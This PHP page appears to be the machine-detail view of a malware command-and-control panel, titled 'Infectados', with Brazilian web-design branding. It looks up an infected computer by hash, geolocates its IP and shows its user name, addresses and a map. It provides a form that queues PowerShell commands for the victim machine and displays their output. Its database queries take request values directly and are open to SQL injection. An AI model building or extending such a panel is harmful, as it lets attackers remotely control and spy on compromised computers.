<?php 
$int = 3;
if ($int == 0) {
	$flow = "./";
}elseif ($int == 1) {
	$flow = "../";
}elseif ($int == 2) {
	$flow = "../../";
}elseif ($int == 3) {
	$flow = "../../../";
}elseif ($int == 4) {
	$flow = "../../../../";
}elseif ($int == 5) {
	$flow = "../../../../../";
}elseif ($int == 6) {
	$flow = "../../../../../../";
}
?>

<!DOCTYPE html>
<html>

<!--HEAD COMPLETO-->
<head>
	<title>Infectados</title>
	<meta name="language" content="pt-BR">
	<meta name="description" content="Bem-vindo ao site da nossa empresa de criação de sites! Somos especializados em oferecer soluções web personalizadas e de alta qualidade para atender às necessidades específicas de cada um de nossos clientes.">
	
	<meta name="robots" content="all">
	<meta name="author" content="M0rx">

	<meta name="keywords" content="Stack, StackStore, Comprar site, preciso de um site, criador de site, programador">

	<link rel="canonical" href="https://stackstore.com.br"/>
	<meta property="og:type" content="website">
	<meta property="og:image" content="https://stackstore.com.br/assents/img/logo/NewLogo7.png">

	<meta property="twitter:card" content="summary_large_image">
	<meta property="twitter:image" content="https://stackstore.com.br/assents/img/logo/NewLogo7.png">

	<?php include($flow.'assents/app/head.php');?>
</head>
<?php include($flow.'assents/app/check.php');?>
<?php  


function GetStr($string, $start, $end){

	$str = explode($start, $string);
	$str = explode($end, $str[1]);
	return $str[0];

}

if (isset($_GET['hash']) && !empty($_GET['hash'])) {
	$hashMachine = input($_GET['hash']);
	$sql_hash = "SELECT * FROM `nebula-infectado` WHERE `MachineHash`='$hashMachine'";
	$k = $connect->query($sql_hash)->num_rows;
	if ($k == 1) {
		$HashConsult = $connect->query($sql_hash);
		$InfosMachine = $HashConsult->fetch_array();

		$response = file_get_contents("http://www.geoplugin.net/json.gp?ip=l".$InfosMachine['MachineIp']);
		
		$pais = GetStr($response,'countryName":"','"');
		$city = GetStr($response,'_city":"','"');
		$estado = GetStr($response,'_regionName":"','"');


		if (isset($_GET['commandsend'])) {
			$command = $_GET['commandsend'];
			$sql_update = "UPDATE `nebula-infectado` SET `MachineCommand`='$command' WHERE `MachineHash`='$hashMachine'";
			$connect->query($sql_update);
			header('Location:'.$flow.'dashboard/infectados/config/?hash='.$hashMachine);
		}

	}else{
		session_destroy();
		header('Location:'.$flow);
	}

}else{
	session_destroy();
	header('Location:'.$flow);
}




?>

<!--Importando Css-->
<?php include($flow.'assents/css/style_global.php'); ?>

<body>

<!--Ativar/Desligar Load-->
<?php #include($flow.'assents/app/load.php'); ?>

<!--Ativar Navbar Editar-->
<?php include($flow.'assents/app/navbar.php'); ?>

<!-- Body -->

<div class="dashboard">
	<div class="container">
		<div class="dashboard-config">
			<div class="row">
				<div class="col-md-6">
					<div class="card card-cmd">
						<div class="card-body">
							<div class="form-group">
								<label class="title-config">Command PowerShell</label>
								<form method="GET">
									<input type="hidden" value="<?php echo $hashMachine ?>" name="hash">
									<input type="text" class="form-control form-config" name="commandsend">
									<button type="submit" class="btn btn-cmd">Enviar Packet</button>
								</form>
								<hr>
								<textarea class="form-control form-config" rows="15" id="comment" name="text"><?php echo $InfosMachine['MachineResult']; ?></textarea>
							</div>
						</div>
					</div>
				</div>
				<div class="col-md-6">
					<div class="card card-cmd">
						<div class="card-body card-infos"><span class="badge background-fail">Offline</span><br>
							Machine: <?php echo $InfosMachine['Machine']; ?><br>NameUser: <?php echo $InfosMachine['MachineName']; ?><br><img width="30px" src="<?php echo $flow ?>assents/img/flags/br.png"> <?php echo $pais ?> (<?php echo $city ?>/<?php echo $estado ?>)<br>Ipv4: <?php echo $InfosMachine['MachineIpv4']; ?><br>MachineIp: <?php echo $InfosMachine['MachineIp']; ?><br><br>Install: <?php echo $InfosMachine['MachineInstall']; ?><hr>
							<div style="width: 100%">
								<iframe width="100%" height="200" frameborder="0" scrolling="no" marginheight="0" marginwidth="0" src="https://maps.google.com/maps?width=100%25&amp;height=600&amp;hl=en&amp;q=<?php echo $pais ?> <?php echo $estado ?> <?php echo $city ?>&amp;t=&amp;z=14&amp;ie=UTF8&amp;iwloc=B&amp;output=embed">
								</iframe>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
</div>



<!-- Finalizar/Body -->

<!--Ativar Footer Editar-->
<?php #include($flow.'assents/app/footer.php'); ?>

<!--Import Cookie Enable-->
<?php include($flow.'assents/app/cookie.php'); ?>


<script type="text/javascript">
	$(document).ready( function () {
	    $('#table-infectados').DataTable({
	    	responsive: true,
	    	paging: false,
	    	select: true
	    });
	} );

	$(document).ready( function () {
	    $('#Stable-infectados').DataTable({
	    	responsive: true,
	    	paging: false,
	    	select: false,
	    	searching: false,
	    });
	} );
</script>
</body>
</html>